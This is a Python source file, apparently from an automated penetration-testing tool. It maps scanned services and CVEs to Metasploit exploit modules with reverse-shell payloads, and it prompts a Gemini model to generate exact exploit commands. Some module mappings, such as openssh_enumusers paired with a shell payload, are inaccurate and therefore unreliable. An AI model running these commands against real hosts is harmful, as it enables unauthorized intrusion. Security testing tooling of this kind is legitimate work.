import os
import json

# Try to get API key from environment variable
api_key = os.getenv('GOOGLE_API_KEY')

if not api_key:
    print("WARNING: GOOGLE_API_KEY environment variable not set. Using fallback data.")
    # Fallback without AI - just return basic exploit info
    def find_metasploit_exploit(exploit_data):
        """
        Generate basic Metasploit exploit info without AI
        """
        service = exploit_data.get('service', 'unknown')
        cve_id = exploit_data.get('cve_id', 'unknown')
        
        # Basic exploit mappings for common vulnerabilities
        exploit_mappings = {
            'vsftpd': {
                'exploit_module': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 21)
                },
                'optional_options': {},
                'payload': 'payload/cmd/unix/reverse',
                'commands': [
                    f'use exploit/unix/ftp/vsftpd_234_backdoor',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 21)}',
                    'set payload payload/cmd/unix/reverse',
                    'exploit'
                ]
            },
            'openssh': {
                'exploit_module': 'exploit/linux/ssh/openssh_enumusers',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 22)
                },
                'optional_options': {},
                'payload': 'payload/generic/shell_reverse_tcp',
                'commands': [
                    f'use exploit/linux/ssh/openssh_enumusers',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 22)}',
                    'set payload payload/generic/shell_reverse_tcp',
                    'exploit'
                ]
            },
            'apache': {
                'exploit_module': 'exploit/multi/http/apache_normalize_path_rce',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 80)
                },
                'optional_options': {},
                'payload': 'payload/cmd/unix/reverse',
                'commands': [
                    f'use exploit/multi/http/apache_normalize_path_rce',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 80)}',
                    'set payload payload/cmd/unix/reverse',
                    'exploit'
                ]
            },
            'samba': {
                'exploit_module': 'exploit/linux/samba/is_known_pipename',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 445)
                },
                'optional_options': {},
                'payload': 'payload/cmd/unix/reverse',
                'commands': [
                    f'use exploit/linux/samba/is_known_pipename',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 445)}',
                    'set payload payload/cmd/unix/reverse',
                    'exploit'
                ]
            }
        }
        
        # Return specific exploit if available, otherwise generic
        if service.lower() in exploit_mappings:
            return exploit_mappings[service.lower()]
        else:
            return {
                'exploit_module': 'exploit/multi/handler',
                'required_options': {
                    'RHOSTS': exploit_data.get('host', '192.168.1.1'),
                    'RPORT': exploit_data.get('port', 80)
                },
                'optional_options': {},
                'payload': 'payload/generic/shell_reverse_tcp',
                'commands': [
                    f'use exploit/multi/handler',
                    f'set RHOSTS {exploit_data.get("host", "192.168.1.1")}',
                    f'set RPORT {exploit_data.get("port", 80)}',
                    'exploit'
                ]
            }
else:
    # Use Google Gemini API if key is available
    try:
        from google import genai
        client = genai.Client(api_key=api_key)
        
        def find_metasploit_exploit(exploit_data):
            """
            Generate Metasploit exploit commands for a given exploit using AI
            """
            prompt = f"""
            For the following vulnerability, provide the exact Metasploit commands to exploit it:
            
            Vulnerability Data: {json.dumps(exploit_data, indent=2)}
            
            Return ONLY the msfconsole commands in this exact format:
            {{
                "exploit_module": "exploit/path/to/module",
                "required_options": {{
                    "RHOSTS": "target_ip",
                    "RPORT": "port_number",
                    "other_option": "value"
                }},
                "optional_options": {{
                    "optional_option": "value"
                }},
                "payload": "payload/path",
                "commands": [
                    "use exploit/path/to/module",
                    "set RHOSTS target_ip",
                    "set RPORT port_number",
                    "set payload payload/path",
                    "exploit"
                ]
            }}
            """
            
            try:
                response = client.models.generate_content(
                    model="gemini-2.5-flash",
                    contents=prompt
                )
                
                # Try to parse the response as JSON
                try:
                    return json.loads(response.text)
                except json.JSONDecodeError:
                    # Fallback if JSON parsing fails
                    return {
                        "exploit_module": "exploit/multi/handler",
                        "required_options": {"RHOSTS": exploit_data.get('host', '192.168.1.1')},
                        "optional_options": {},
                        "payload": "payload/generic/shell_reverse_tcp",
                        "commands": [
                            "use exploit/multi/handler",
                            f"set RHOSTS {exploit_data.get('host', '192.168.1.1')}",
                            "exploit"
                        ]
                    }
                    
            except Exception as e:
                return {
                    "error": f"Failed to generate exploit commands: {str(e)}",
                    "exploit_module": "exploit/multi/handler",
                    "required_options": {"RHOSTS": exploit_data.get('host', '192.168.1.1')},
                    "optional_options": {},
                    "payload": "payload/generic/shell_reverse_tcp",
                    "commands": [
                        "use exploit/multi/handler",
                        f"set RHOSTS {exploit_data.get('host', '192.168.1.1')}",
                        "exploit"
                    ]
                }
    except ImportError:
        print("WARNING: google-genai package not installed. Using fallback data.")
        # Use the fallback function defined above
        pass

def process_exploits_for_host(host_data):
    """
    Process all exploits found for a host and generate Metasploit commands
    """
    results = []
    
    print(f"Processing exploits for host: {host_data.get('host')}")
    print(f"Services: {host_data.get('services', [])}")
    
    for service in host_data.get('services', []):
        print(f"Processing service: {service}")
        if service.get('cves'):
            print(f"Found CVEs: {service['cves']}")
            for cve in service['cves']:
                exploit_info = {
                    'host': host_data['host'],
                    'port': service['port'],
                    'service': service['service'],
                    'product': service.get('product', 'Unknown'),
                    'version': service.get('version', 'Unknown'),
                    'cve_id': cve['id'],
                    'cve_severity': cve.get('severity', 'Unknown'),
                    'cve_score': cve.get('score', 'Unknown')
                }
                
                print(f"Generating Metasploit commands for: {exploit_info}")
                
                # Generate Metasploit commands
                metasploit_commands = find_metasploit_exploit(exploit_info)
                exploit_info['metasploit_commands'] = metasploit_commands
                
                print(f"Generated commands: {metasploit_commands}")
                results.append(exploit_info)
        else:
            print(f"No CVEs found for service: {service}")
    
    print(f"Total results: {len(results)}")
    return results